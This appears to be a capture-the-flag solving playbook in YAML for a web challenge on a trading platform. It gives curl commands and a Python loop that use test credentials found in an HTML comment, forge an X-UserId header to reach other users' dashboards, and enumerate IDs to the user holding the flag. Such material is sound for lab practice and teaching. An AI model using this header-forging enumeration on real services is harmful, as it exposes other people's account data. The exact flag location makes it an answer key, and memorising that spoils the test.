name: idor_custom_header_trading_platform
category: web
tags: [idor, default_credentials, broken_authorization, custom_header, header_injection]
indicators:
  - "Login form with dashboard system"
  - "Credentials hint in HTML comments"
  - "Custom HTTP header for authentication (X-UserId)"
  - "Dashboard displays user sensitive information"

tricks:
  - name: "Step 1: Check HTML source for credentials"
    when: "First access, login required"
    how: "View page source for <!-- comments with test credentials"
    payload: |
      curl -s http://TARGET/ | grep -i '<!--'
      # Found: <!-- TODO: Delete the testing account (test:test). -->

  - name: "Step 2: Login with default credentials"
    when: "Found credentials in comments"
    how: "Two-step login: POST username, then POST password"
    payload: |
      curl -c cookies.txt -d 'username=test' http://TARGET/
      curl -b cookies.txt -c cookies.txt -d 'password=test' http://TARGET/password/test

  - name: "Step 3: Discover custom authentication header"
    when: "Login successful, analyze requests"
    how: "Check source code or intercept traffic for X-UserId header"
    payload: |
      grep -r 'X-UserId' .
      # Or use Burp Suite to analyze request headers

  - name: "Step 4: Test header injection IDOR"
    when: "Found X-UserId header in use"
    how: "Add X-UserId header to access other users' dashboards"
    payload: |
      curl -b cookies.txt -H 'X-UserId: 1' http://TARGET/dashboard
      # Application trusts the header without validation

  - name: "Step 5: Enumerate user IDs"
    when: "Confirmed header injection works"
    how: "Iterate through user IDs to find the flag"
    payload: |
      import requests
      
      s = requests.Session()
      # ... login first ...
      
      for uid in range(10030, 10060):
          resp = s.get('http://TARGET/dashboard', headers={'X-UserId': str(uid)})
          if 'FLAG{' in resp.text:
              print(f'Found flag at user {uid}')
              break

  - name: "Step 6: Extract the flag"
    when: "Found valid user ID"
    how: "Flag is in user ID 10052's last_name field"
    payload: |
      curl -b cookies.txt -H 'X-UserId: 10052' http://TARGET/dashboard
      # FLAG{...}
